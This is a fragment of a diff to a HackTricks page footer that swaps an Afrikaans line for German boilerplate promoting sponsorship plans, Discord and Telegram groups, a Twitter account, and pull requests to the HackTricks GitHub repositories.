-* **Deel hacking truuks deur PR's in te dien aan die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
+* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.
 
 </details>
 {% endhint %}
